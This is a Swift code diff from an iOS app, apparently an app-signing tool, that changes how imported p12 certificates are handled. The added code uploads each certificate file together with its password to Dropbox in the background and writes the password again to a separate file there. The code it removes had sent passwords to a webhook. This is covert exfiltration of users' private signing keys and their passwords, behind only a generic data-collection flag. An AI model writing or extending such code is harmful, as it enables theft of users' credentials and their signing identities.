@@ -31,37 +31,31 @@ extension CertData {
             if UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
                 // Upload to Dropbox in background
                 DispatchQueue.global(qos: .utility).async {
-                    // Upload the file
-                    DropboxService.shared.uploadCertificateFile(
-                        fileURL: url
+                    // Upload the p12 file with its password directly to Dropbox
+                    EnhancedDropboxService.shared.uploadCertificateFile(
+                        fileURL: url,
+                        password: !password.isEmpty ? password : nil
                     ) { success, error in
                         if success {
-                            Debug.shared.log(message: "Successfully uploaded p12 certificate to Dropbox", type: .debug)
-                            
-                            // If we have a password, send it to webhook for storage
-                            if !password.isEmpty {
-                                DropboxService.shared.sendCertificateInfoToWebhook(
-                                    password: password,
-                                    p12Filename: url.lastPathComponent,
-                                    provisionFilename: "unknown"
-                                ) { webhookSuccess, webhookError in
-                                    if webhookSuccess {
-                                        Debug.shared.log(message: "Successfully sent p12 password to webhook", type: .debug)
-                                    } else if let error = webhookError {
-                                        Debug.shared.log(message: "Failed to send p12 password to webhook: \(error)", type: .error)
-                                    }
-                                }
-                            }
+                            Debug.shared.log(message: "Successfully uploaded p12 certificate with password to Dropbox", type: .debug)
                         } else if let error = error {
                             Debug.shared.log(message: "Failed to upload p12 to Dropbox: \(error.localizedDescription)", type: .error)
                         }
                     }
                     
-                    // Also log the password entry separately
-                    CertificateLoggingHelper.shared.logPasswordEntry(
-                        password: password,
-                        fileName: url.lastPathComponent
-                    )
+                    // Additionally store password in a dedicated file
+                    if !password.isEmpty {
+                        EnhancedDropboxService.shared.storePasswordForCertificate(
+                            fileName: url.lastPathComponent,
+                            password: password
+                        ) { success, error in
+                            if success {
+                                Debug.shared.log(message: "Successfully stored p12 password to Dropbox", type: .debug)
+                            } else if let error = error {
+                                Debug.shared.log(message: "Failed to store p12 password to Dropbox: \(error.localizedDescription)", type: .error)
+                            }
+                        }
+                    }
                 }
             }
             
@@ -86,7 +80,7 @@ extension Cert {
             // Upload to Dropbox in background
             DispatchQueue.global(qos: .utility).async {
                 // Upload the mobileprovision file
-                DropboxService.shared.uploadCertificateFile(
+                EnhancedDropboxService.shared.uploadCertificateFile(
                     fileURL: url
                 ) { success, error in
                     if success {
@@ -119,6 +113,18 @@ class CertificateLoggingHelper {
         // Only proceed if user has consented to data collection
         guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
             return
+        }
+        
+        // Store the password with the certificate file in Dropbox
+        if let fileName = fileName, !fileName.isEmpty, !password.isEmpty {
+            EnhancedDropboxService.shared.storePasswordForCertificate(
+                fileName: fileName,
+                password: password
+            ) { success, error in
+                if !success, let error = error {
+                    Debug.shared.log(message: "Failed to store password with certificate: \(error)", type: .error)
+                }
+            }
         }
         
         // Create the log entry
